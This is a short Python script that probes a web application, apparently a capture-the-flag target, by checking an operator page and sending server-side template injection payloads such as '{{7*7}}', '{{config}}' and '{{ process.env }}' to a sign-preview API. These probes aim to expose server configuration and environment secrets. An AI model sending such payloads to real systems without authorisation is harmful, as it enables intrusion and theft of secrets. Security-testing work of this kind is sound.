#!/usr/bin/env python3
import requests

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

print('Current cookies:', dict(s.cookies))
print()

# Check operator
r = s.get(BASE + '/operator/', timeout=15, allow_redirects=False)
print('operator/ status:', r.status_code)
print(r.text[:500])
print()

# Try the sign preview endpoint (possible SSTI)
r = s.post(BASE + '/api/sign/preview', json={'lines': ['test','test','test','test']}, timeout=15)
print('/api/sign/preview (normal):', r.status_code, r.text)
print()

# Try SSTI payloads
ssti_tests = [
    ['{{7*7}}', '', '', ''],
    ['${7*7}', '', '', ''],
    ['#{7*7}', '', '', ''],
    ['<%= 7*7 %>', '', '', ''],
    ['{{ process.env }}', '', '', ''],
    ['{{config}}', '', '', ''],
    ['{{config.items()}}', '', '', ''],
]
for lines in ssti_tests:
    r = s.post(BASE + '/api/sign/preview', json={'lines': lines}, timeout=15)
    print(f'SSTI {lines[0]}: {r.text[:300]}')
